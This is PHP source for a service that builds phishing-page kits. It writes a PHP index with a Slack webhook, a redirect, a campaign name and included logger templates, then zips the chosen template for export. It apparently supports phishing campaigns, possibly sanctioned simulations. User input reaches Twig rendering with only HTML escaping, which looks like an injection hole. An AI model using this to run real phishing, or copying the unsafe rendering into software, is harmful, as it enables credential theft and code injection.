<?php
namespace App\Service;

use Twig\Environment;

class TemplateGenerator
{
    public $template;
    public $campaign;
    public $title;
    public $slack;
    public $redirect;

    public $rootPath    = '/www/public/static/phish_templates';
    public $exportPath  = '/www/public/static/exports';
    public $exportName  = 'phishtale.zip';
    public $indexPage;

    private $twig;

    public function __construct($template, $campaign, $title, $slack, $redirect, Environment $twig)
    {
        $this->template   = $template;
        $this->campaign   = htmlentities($campaign);
        $this->title      = htmlentities($title);
        $this->slack      = htmlentities($slack);
        $this->redirect   = htmlentities($redirect);
        $this->twig       = $twig;
    }

    public function verifyTemplate()
    {
        return in_array($this->template, explode(',', $_SERVER['PHISH_TEMPLATES']));
    }

    public function generateIndex()
    {
        $phishPage = "<?php \n\n";
        $phishPage .= "\$slack_webhook = \"$this->slack\"; \n";
        $phishPage .= "\$redirect = \"$this->redirect\"; \n";
        $phishPage .= "\$campaign = \"$this->campaign\"; \n";
        $phishPage .= "\$title = \"$this->title\"; \n";
        $phishPage .= "{% include '@phish/slack.php.twig' %}\n";
        $phishPage .= "{% include '@phish/logger.php.twig' %}\n";
        $phishPage .= "?>\n\n";
        $phishPage .= "{% include '@phish/$this->template/template.php' %}\n";

        $this->indexPage = $this->twig->createTemplate($phishPage)->render();
    }

    public function createArchive()
    {
        $zip = new \ZipArchive();
        $zip->open($this->exportPath . '/' . $this->exportName, \ZipArchive::CREATE | \ZipArchive::OVERWRITE);
        $files = new \RecursiveIteratorIterator(
            new \RecursiveDirectoryIterator($this->rootPath . "/" . $this->template),
            \RecursiveIteratorIterator::LEAVES_ONLY
        );

        foreach ($files as $name => $file)
        {
            if (!$file->isDir())
            {
                $filePath = $file->getRealPath();
                $relativePath = substr($filePath, strlen($this->rootPath) + 1);

                $zip->addFile($filePath, $relativePath);
            }
        }

        $zip->addFromString($this->template.'/index.php', $this->indexPage);
        $zip->close();

        return true;
    }
}
